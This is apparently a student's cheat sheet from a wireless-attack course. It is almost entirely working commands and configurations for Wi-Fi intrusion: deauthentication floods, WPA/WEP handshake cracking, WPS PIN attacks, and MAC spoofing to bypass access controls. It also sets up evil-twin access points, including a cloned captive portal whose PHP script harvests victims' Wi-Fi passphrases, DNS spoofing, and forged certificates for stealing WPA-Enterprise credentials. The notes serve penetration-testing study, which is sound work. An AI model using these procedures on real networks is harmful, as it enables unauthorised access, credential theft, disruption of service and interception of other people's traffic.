# Basic commands
```
iwconfig
sudo iwlist wlan0 frequency

sudo iw list
sudo iw dev wlan0 scan | grep SSID
sudo iw dev wlan0 scan | egrep "DS Parameter set|SSID:"

sudo iw dev wlan0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up
sudo iw dev wlan0mon info
sudo tcpdump -i wlan0mon

sudo iw dev wlan0mon interface del
sudo iw dev wlan0mon info

sudo rfkill list
sudo rfkill block 1
sudo rfkill unblock 1

sudo rfkill block all
sudo rfkill unblock all

#Wireshark
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up

#channel hope (Can be used to scan ssid)
sudo airodump-ng wlan0mon --band abg

```

# Wireshaek filter
```
((wlan addr1 F4:05:95:35:23:F4) or (wlan addr2 F4:05:95:35:23:F4) or (wlan addr3 F4:05:95:35:23:F4) or (wlan addr4 F4:05:95:35:23:F4)) and (not subtype beacon)

((wlan addr1 F4:05:95:35:23:F4) or (wlan addr2 F4:05:95:35:23:F4) or (wlan addr3 F4:05:95:35:23:F4) or (wlan addr4 F4:05:95:35:23:F4)) and not (subtype beacon) and not (type ctl) and not (subtype probe-req) and not (subtype probe-resp)

```

# Wireshaek as command line
```
# lists all the available interfaces
sudo wireshark -D

#start automatically the capture
sudo wireshark -i wlan0mon -k

# enables monitor mode in the selected wireless interface
sudo wireshark -i wlan0 -I -k

#filter
sudo wireshark -i wlan0mon -k -f "not subtype beacon"

#capture the first few bytes of each frame
sudo wireshark -i wlan0mon -k -s 60

#open capture file (no privilege needed)
wireshark wifi.pcap
```

# other useful command
```
#TCPdump output on stdout (- after -w means stdout)
sudo tcpdump -i wlan0mon -w - -U

#dumpcap output on stdout
sudo dumpcap -w - -P -i wlan0mon

#tshark output on stdout
sudo tshark -w - -i wlan0mon

#Capturing traffic and piping it to Wireshark
sudo tcpdump -U -w - -i wlan0mon | wireshark -k -i -

#capture with Wireshark on a named pipe
mkfifo /tmp/named_pipe
ls -l /tmp/named_pipe

sudo wireshark -k -i /tmp/named_pipe
sudo tcpdump -U -w - -i wlan0mon > /tmp/named_pipe

#wpa_passphrase example usage
wpa_passphrase test abcdefg:
```

## Capturing traffic with tcpdump on remote host and piping it to Wireshark
```
ssh root@10.11.0.196 "sudo -S tcpdump -U -w - -i wlan0mon" | sudo wireshark -k -i -
```

# Aircrack-ng Essentials
## Airmon-ng
```
#displays the status and information about the wireless interfaces
sudo airmon-ng

#Checking for network managers
sudo airmon-ng check
#Killing network managers with Airmon-ng
sudo airmon-ng check kill

#enabling monitor mode on wlan0
sudo airmon-ng start wlan0

#enabling monitor mode on wlan0, channel 3
sudo airmon-ng start wlan0 3

sudo iw dev wlan0mon info
sudo iwconfig wlan0mon

sudo airmon-ng --verbose
sudo airmon-ng --debug

#stop option with Airmon-ng


```

## Airodump-ng
```
#Airodump command on a fixed channel
sudo airodump-ng wlan0mon -c 2

#Airodump-ng focused on a channel and BSSID
sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon
```

## Airplay-ng
```
#Aireplay-ng injection test
sudo airmon-ng start wlan0 3
sudo aireplay-ng -9 wlan0mon

#Injection Test 
sudo aireplay-ng -9 wlan0mon
sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon

#Card-to-Card (Attack) Injection Test
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

## Aircrack-ng
```
#Aircrack-ng Benchmark
aircrack-ng -S

#Removing Wireless Headers
sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap

#Clients to AP Relationship Graph (dump-01.csv is a dump made by aircrack-ng "sudo airodump-ng wlan0mon -w out --output-format csv")
mkdir support
cd support
wget http://standards-oui.ieee.org/oui.txt
cd ..
airgraph-ng -o Picture1_png -i dump-01.csv -g CAPR

#Clients Probe Graph (relationships between wireless clients and probed networks)
airgraph-ng -o Picture2.png -i dump-01.csv -g CPG

```

# Cracking Authentication WPA Hashes
## Using Aircrack-ng Suite
```
#listening with airodump (should keep listening few minutes after deauth)
sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
# deauthentication (-c option is for the client)
sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon

#cracking 
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap

#verigy the key by decrypting the traffic (assuming here 1234567 is the key)
airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap

#using Aircrack-ng with John the Ripper
## In order to add two numbers to the end of each password, add the following to  /etc/john/john.conf
$[0-9]$[0-9]
$[0-9]$[0-9]$[0-9]

##testing the rules 
john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123

# crackinng using jtr
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap

# cracking unsing crunch
crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -


#cracking with rsmangler
echo bird > wordlist.txt
echo cat >> wordlist.txt
echo dog >> wordlist.txt

rsmangler --file wordlist.txt --output mangled.txt
rsmangler --file wordlist.txt --min 12 --max 13
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -

#cracking with hashcat
## benchmarking
hashcat -b -m 2500
hashcat -b -m 22000

## cracking using 2500 mode
/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
hashcat -m 2500 --deprecated-check-disable output.hccapx /usr/share/john/password.lst

## cracking using 22000 mode
hcxpcapngtool -o hash.hc22000  wifu-01.cap
hashcat -a 0 -m 22000  hash.hc22000 /usr/share/john/password.lst --force

# craking using Airolib-ng
echo wifu > essid.txt
airolib-ng wifu.sqlite --import essid essid.txt
airolib-ng wifu.sqlite --stats

airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
airolib-ng wifu.sqlite --batch
airolib-ng wifu.sqlite --stats

aircrack-ng -r wifu.sqlite wpa1-01.cap

# cracking using coWPAtty
## Creating pre-computed hash tables using genpmk 
genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu

## Using pre-computed hashtables with coWPAtty
cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu
```

# WPS Attack
```
#Displaying WPS information for each AP
wash -i wlan0mon
wash -5 -i wlan0mon #for 5G

# or using airodump
sudo airodump-ng wlan0mon --wps --band abg

#launching attack
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K #for PixieWPS attack, much faster
```
## Implementation variation
1. Test with empty pin with `-p` option
2. Use the pins generated by the following commands
```
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}
```

# Rogue Access Point 
Open wireshark to get needed information regarding the wifi
```
#Discovery
sudo airodump-ng -w discovery --output-format pcap wlan0mon

#wireshark filter to get more info on the wifi (assuming Mostar is the ssid)
wlan.fc.type_subtype == 0x08 && wlan.ssid == "Mostar"

# Creating a Rogue AP
sudo apt install hostapd-mana

# configuration of mona (cat Mostar-mana.conf)
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/mostar.hccapx

#explanation
hw_mode=>g for 2.4GHz and hw_mode=>a for 5GHz
ieee80211n=1 => for IEEE 802.11n (default is 802.11b)
wpa=3 => for WPA1 or WPA2

#runnning mona
sudo hostapd-mana Mostar-mana.conf

# Deauthenticating every client connected to FC:7A:2B:88:63:EF (using another wifi card)
sudo iwconfig wlan0mon channel 44
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon

# cracking
aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
```

# Attacking Captive Portals
## Discovery
```
sudo airmon-ng check kill
sudo airmon-ng start wlan0 
sudo airodump-ng -w discovery --band abg --output-format pcap wlan0mon

# Deauthenticating Clients
sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
```

## Building the Captive Portal
```
sudo apt install apache2 libapache2-mod-php
#cloning captive portal
wget -r -l2 https://www.megacorpone.com

#Captive Portal login page
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>

#setting up 
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/
sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/

#writing  login_check.php
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```

## Networking Setup
```
# wlan0 IP address configuration
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up

# Installing and configuring dnsmasq for DHCP
sudo apt install dnsmasq
```
### configuration file for DHCP (mco-dnsmasq.conf)
```
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# Addition to dnsmasq for DNS spoofing
# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```
Starting dnsmasq and checking in syslog
```
sudo dnsmasq --conf-file=mco-dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq
sudo netstat -lnp
```
Force redirect all clients DNS requests
```
sudo apt install nftables

sudo nft add table ip nat

sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'

sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```
Configuration of mod_rewrite and mod_alias rules for captive portal detection in `/etc/apache2/sites-enabled/000-default.conf` before the VirtualHost closing tag.
```
...

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```
Enabling mod_rewrite
```
sudo a2enmod rewrite
sudo a2enmod alias
sudo systemctl restart apache2
```
### VirtualHost section for HTTPS
```
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```
Enabling mod_ssl and restart Apache
```
sudo a2enmod ssl
sudo systemctl restart apache2
```

## Setting Up and Running the Rogue AP
Rogue AP hostapd configuration (sudo hostapd -B mco-hostapd.conf)
```
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

Running hostapd
```
sudo hostapd -B mco-hostapd.conf
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'

sudo tail -f /var/log/apache2/access.log
sudo find /tmp/ -iname passphrase.txt
```

# Attacking WPA Enterprise 
WPA Enterprise uses Extensible Authentication Protocol (EAP)
EAP authentication methods:
- EAP Transport Layer Security (EAP-TLS) => certificates on the server side and client side
- EAP Tunneled Transport Layer Security (EAP-TTLS) => does not necessarily need client certificates. Creates a tunnel and then exchanges the credentials using Challenge-Handshake Authentication Protocol (CHAP), Authentication Protocol (PAP), Microsoft CHAP (MS-CHAP), or MS-CHAPv2.
- Protected Extensible Authentication Protocol (PEAP) => creates a TLS tunnel before credentials are exchanged using MS-CHAPv2 (common method).

We will be creating a rogue AP to match the settings of our target as closely as possible. We will use hostapd-mana to create the rogue AP and match the target settings. This will help us capture the credentials, which we will crack later.

```
#airodump
sudo airodump-ng wlan0mon

#MGT => WPA Enterprise
```

Deauthenticate a client in order to get the certificate. Once airodump-ng indicates we've captured a handshake, we can stop the capture and disable monitor mode with `sudo airmon-ng stop wlan0mon`.

Wireshark filter for certificate
```
tls.handshake.certificate
```
Packet Details => Extensible Authentication Protocol => Transport Layer Security
TLSv1 Record Layer: Handshake Protocol: Certificate => Handshake Protocol: Certificate => Certificates
Right click and select Export Packet (in .der format)

```
# view certificate details 
openssl x509 -inform der -in CERTIFICATE_FILENAME.der -text 


#convert it to PEM
openssl x509 -inform der -in CERTIFICATE_FILENAME.der -outform pem -out OUTPUT_PEM.crt
```

## Generate certificates that look similar to the ones we received.
```
sudo apt install freeradius
sudo -s
cd /etc/freeradius/3.0/certs
nano ca.cnf
...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
...

nano server.cnf
...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = server@playtronics.com
commonName              = "Playtronics"
...

nano client.cnf
...
[client]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = client@playtronics.com
commonName              = "Playtronics"
...

rm dh
make destroycerts
make

sudo apt install hostapd-mana
nano /etc/hostapd-mana/mana.conf

# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file (file content is below)
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```
Creating the EAP user file referenced in the configuration file 
```
nano /etc/hostapd-mana/mana.eap_user
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
Clone interface mac address to look likes the legetimated mac **only if it is not possible to deauth, otherwise leave mac and proceed to deauth with another interface**
```
sudo macchanger -m f0:9f:c2:71:22:1a wlan0
```
Start hostapd-mana
```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```

When a victim attempts to authenticate to our AP, the login attempt is captured and stored to /tmp/hostapd.credout.

Cracking credentials, can also be done with `crackapd` which can automatically run asleap when it sees credentials in the log file
```
Running asleap on hostAPd credentials
asleap -C 1e:63:41:b1:6b:20:9c:5d -R 8c:fb:c3:c0:70:b8:5a:f2:c8:f9:46:a5:7d:64:12:b1:66:e0:7e:8a:cc:86:65:77 -W rockyou.txt
```

# bettercap Essentials
## Installation and Executing
```
sudo apt install bettercap
sudo bettercap -iface wlan0

help
clear
exit
```

## Wi-Fi Module
```
wifi.recon on
wifi.recon.channel 6,11
wifi.show 
wifi.show.filter "WPA2" 
wifi.recon c6:2d:56:2a:53:f8
#client filtering (starting by c0)
wifi.show.filter ^c0 
set wifi.show.filter ""

# Using ticker to display wireless stations (The default refresh interval is one second)
set ticker.commands "clear; wifi.show"
wifi.recon on
ticker on
# ticker off to stop

#can be done also out of the tool option with
sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"

#Deauthenticating a Client (will deauth every client if the mac address is for the AP)
wifi.deauth c6:2d:56:2a:53:f8

#capturing handshakes
wifi.recon off
get wifi.handshakes.file 
set wifi.handshakes.file "/home/kali/handshakes/"
set wifi.handshakes.aggregate false
wifi.recon on
wifi.deauth c6:2d:56:2a:53:f8

#deauth filter
set wifi.deauth.skip ac:22:0b:28:fd:22
```
### bettercap Caplets
```
cd /usr/share/bettercap/caplets/
cat -n massdeauth.cap

cat -n deauth_corp.cap
set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} Â» {reset}

set ticker.period 10
set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8

events.ignore wifi.ap.new
events.ignore wifi.client.probe
events.ignore wifi.client.new

wifi.recon on
ticker on
events.clear
clear
```
```
sudo bettercap -iface wlan0 -caplet deauth_corp.cap
```
### bettercap Web Interface
```
sudo nft add table inet filter
sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }
sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept
sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept

cat -n /usr/share/bettercap/caplets/https-ui.cap
 1	# api listening on https://0.0.0.0:8083/ and ui on https://0.0.0.0
 2	set api.rest.address 0.0.0.0
 3	set api.rest.port 8083
 4	set https.server.address 0.0.0.0
 5	set https.server.port 443
 6
 7	# make sure both use the same https certificate so api requests won't fail
 8	set https.server.certificate ~/.bettercap-https.cert.pem
 9	set https.server.key ~/.bettercap-https.key.pem
10	set api.rest.certificate ~/.bettercap-https.cert.pem
11	set api.rest.key ~/.bettercap-https.key.pem
12	# default installation path of the ui
13	set https.server.path /usr/share/bettercap/ui
14
15	# !!! CHANGE THESE !!!
16	set api.rest.username offsec
17	set api.rest.password wifu
18
19	# go!
20	api.rest on
21	https.server on


sudo bettercap -iface wlan0 -caplet https-ui

```

# Kismet Essentials
## Basic
```
sudo apt install kismet
ls -al /etc/kismet/
# kismet_80211.conf => wifi 
# kismet_alerts => Wireless Intrusion Detection System (WIDS)

sudo kismet -c wlan0 --no-ncurses
sudo kismet -c wlan0:channels="4,5,6" --no-ncurses
sudo kismet --daemonize

```
For the web interface, Data sources should be enabled first

## Remote Capture
```
kali@kali:~$ sudo kismet

kali@kaliremote:~$ ssh kali@192.168.62.192 -L 8000:localhost:3501
kali@kaliremote:~$ sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --user offsec --password lab --source=wlan0:name=remote-wlan0

```
Opening a kismet file with sqlite
```
sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet
.tables
.schema devices
.headers on
select type, devmac from devices;
.quit

#
sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet "select type, devmac from devices;"
```
Reading Log Files
```
sudo kismet -c Documents/Network_Join_Nokia_Mobile.pcap:realtime=true
```

Exporting Log
```
kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --list-datasources
kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose
```

Converting kismet log
```
kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose
```

# Manual Network Connections
## Connecting to an Access Point
Simple wpa_supplicant configuration for an open network
```
network={
  ssid="hotel_wifi"
  scan_ssid=1
  key_mgmt=NONE
}
```
Simple wpa_supplicant configuration for a WPA or WPA2-PSK network
```
network={
  ssid="home_network"
  scan_ssid=1
  psk="correct battery horse staple"
  key_mgmt=WPA-PSK
}
```
Connecting to home_network
```
sudo wpa_supplicant -i wlan0 -c wifi-client.conf
sudo wpa_supplicant -i wlan0 -c wifi-client.conf -B #B for background

sudo dhclient -v wlan0
```

## Setting up an Access Point

### Configure Internet access on the system.
```
sudo iw list # check if there is AP
```
### Set up a static IP for the wireless interface.
```
sudo ip link set wlan0 up
sudo ip addr add 10.0.0.1/24 dev wlan0
```
### DHCP server set up, to provide automatic IP configuration for Wi-Fi clients.
```
nano dnsmasq.conf
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an 
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
listen-address=10.0.0.1

# DHCP range
dhcp-range=10.0.0.100,10.0.0.199,12h
dhcp-lease-max=100
# Router: wlan0
dhcp-option=option:router,10.0.0.1
dhcp-authoritative

# DNS: Primary and secondary Google DNS
server=8.8.8.8
server=8.8.4.4
```
```
sudo dnsmasq --conf-file=dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq
```
### Add routing to provide Internet access to the Wi-Fi clients.
```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo apt install nftables
sudo nft add table nat
sudo nft 'add chain nat postrouting { type nat hook postrouting priority 100 ; }'
sudo nft add rule ip nat postrouting oifname "eth0" ip daddr != 10.0.0.1/24 masquerade
```
### Configure the Wi-Fi interface in AP mode.
hostapd configuration, hostapd.conf
```
interface=wlan0
ssid=BTTF
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# WPA2 PSK with CCMP
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=GreatScott
```
```
sudo hostapd hostapd.conf
```

# Walkthrough
## Determine channel and monitoring traffic
```
sudo airmon-ng check kill && sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
```

## Get ESSID of the hidden AP having no client connected
We assume here the ESSID is prefixed by wifi-
Pre-recquisis: 
- BSSID (AP mac address). Here F0:9F:C2:6A:88:26
- Channel. Here 11
```
sudo airmon-ng stop wlan0mon
sudo airmon-ng check kill && sudo airmon-ng start wlan0 
sudo iwconfig wlan0mon channel 11

cat ~/rockyou.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
sudo mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
```

## Bypass auth with mac / Ip
```
sudo systemctl stop network-manager
sudo ip link set wlan2 down
sudo macchanger -m F0:9F:C2:71:22:10 wlan2


# retake ip address from dhcp
sudo wpa_supplicant -i wlan2 -c wifi.conf
sudo wpa_supplicant -i wlan2 -c wifi.conf -B #B for background

sudo dhclient -v wlan2

# or set static ip

#ip addr add 192.168.10.11/24 dev ewlan2

# up the interface
sudo ip link set wlan2 up
```

## Cracking and connecting WEP 
### Cracking WEP 
Prerequisites 
1. channel : Here 3
2. BSSID (mac address of AP) : Here F0:9F:C2:71:22:11
```
sudo airmon-ng check kill
sudo airmon-ng stop wlan0mon
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan0 -v
```
### Cracking manually
Need 4 different terminal
```
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w wifi/wifi-old wlan0mon

#generate extra data to the AP by launching  fake authentication at the same time (using fake client mac addr)
sudo aireplay-ng -1 3600 -q  10 -a F0:9F:C2:71:22:11 wlan0mon
#or (preferably) BA:49:A9:53:A1:8C being the mac address of wlan0mon
sudo aireplay-ng -1 3600 -q  10 -a F0:9F:C2:71:22:11 -h BA:49:A9:53:A1:8C wlan0mon

#generate traffic by launching ARP-request replay attack at the same time (using the same fake client mac addr)
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h BA:49:A9:53:A1:8C wlan0mon

# while this is running, deauth a legit connected client (not our wlan0) and/or ping non existent IP address to generate ARP req
sudo aireplay-ng -0 5 -a F0:9F:C2:71:22:11 -c 00:18:4D:1D:A8:1F wlan0mon

# While this is running, crack the password Crack with data captured in a command earlier. (at the same time)
sudo aircrack-ng wifi/wifi-old-01.cap
```

### Connecting to WEP 
wifi-wep.conf
```
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0="12345"  # or wep_key0=11bb33cd55 (hex format: the key decrypted was 11:bb:33:cd:55).
  wep_tx_keyidx=0
}
```
Connecting 
```
sudo wpa_supplicant -i wlan2 -c wep.conf 
#simply way to connect without wpa_supplicant
sudo iwconfig wlan2 essid "wifi-old" key 11bb33cd55 #(sudo iwconfig wlan2 key off) to clear key
sudo dhclient wlan2 -v
```

## Cracking PSK
```
#monitor traffic 
sudo airodump-ng wlan0mon -w wifi/psk-scan -c 6 --wps

#deauth all clients. -a option is for the bssid of the AP
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon

#after capturing handshakes (EAPOL), wait few minutes and crack it with aircrack-ng
sudo aircrack-ng wifi/psk-scan.cap -w rockyou.txt
```

### Connecting to PSK wifi
```
sudo wpa_passphrase wifi-mobile starwars1  > wifi-psk.conf
sudo wpa_supplicant -i wlan0 -c wifi-psk.conf
sudo dhclient wlan0 -v
```
Another `psk.conf`
```
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

## Decrytping PSK traffic
Once the handshake and password obtained, we can decrypt the traffic of each of the users after the handshake, making it very similar to the open networks.
```
#decrypt traffic
sudo airdecap-ng -e wifi-mobile -p starwars1 wifi/psk-scan-01.cap

#read packet 
